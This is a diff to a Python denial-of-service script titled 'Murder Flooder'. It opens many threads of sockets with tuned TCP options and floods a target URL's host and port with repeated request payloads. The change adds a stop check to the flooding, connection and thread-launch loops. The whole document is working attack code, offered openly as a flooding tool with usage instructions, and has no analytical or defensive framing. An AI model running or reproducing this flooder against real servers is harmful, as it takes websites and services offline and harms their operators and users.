@@ -1,10 +1,11 @@
 import socket,ssl,threading,struct,sys
-from MODEL.data import get_target,generate_url_path
+from MODEL.data import get_target,generate_url_path,read
 
 def Murder_flooding(s,r):
     stream = 255
     while True:
      try:
+        if read() == True:break
         s.sendall(r[0])
         s.sendall(r[1])
         if stream == 0:s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0)); stream = 255
@@ -17,6 +18,7 @@ def Murder_connection(target,m):
     try:
       path = 1
       for _ in range(500):
+        if read() == True:break
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
         s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
@@ -34,4 +36,6 @@ if len(sys.argv) == 4:
 else:
  print(f'WELCOME TO MURDER FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
 target = get_target(url)
-for _ in range(thread):[threading.Thread(target=Murder_connection,args=(target,meth)).start() for x in range(10)]
+for _ in range(thread):
+    if read() == True:break
+    [threading.Thread(target=Murder_connection,args=(target,meth)).start() for x in range(10)]
